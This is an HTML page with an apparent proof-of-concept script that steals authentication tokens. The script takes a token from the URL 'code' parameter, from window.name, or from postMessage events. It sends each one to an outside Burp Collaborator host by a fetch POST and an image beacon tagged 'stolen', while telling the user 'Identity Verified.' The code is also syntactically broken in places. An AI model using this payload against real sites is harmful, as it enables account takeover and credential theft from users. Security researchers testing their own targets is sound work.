    <div id="app">Loading...</div>
    <script>
        (function() {
            const output = document.getElementById('app');
            const collabURL = "https://srnboyarclwnk0w6kp055kvdb4hy5otd.oastify.com/";
            
            function exfiltrate(token, method) {
                output.textContent = "Identity Verified.";
                // Method 1: Fetch (POST)
                fetch(collabURL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({ jwt: token, via: method })

                const img = new Image();
                img.src = collabURL + "?stolen=" + encodeURIComponent(token) + "&method=" + method;
            }

            try {
                // VECTOR 1: Grab directly from the URL (As seen in your screenshot)
                const urlParams = new URLSearchParams(window.location.search);
                const codeToken = urlParams.get('code');
                
                if (codeToken) {
                    exfiltrate(codeToken, "url_param");
                }

                // VECTOR 2: Fallback to window.name
                if (window.name) {
                    try {
                        const decoded = JSON.parse(atob(window.name));
                        const winToken = decoded.props.context.environment.authToken;
                        if (winToken) exfiltrate(winToken, "window_name");
                    } catch(e) {}
                }

                // VECTOR 3: Listen for postMessage updates
                window.addEventListener('message', function(e) {
                    const msgToken = e.data?.props?.context?.environment?.authToken;
                    if (msgToken) exfiltrate(msgToken, "post_message");
                });

            } catch (err) {
                console.error("POC Error:", err);
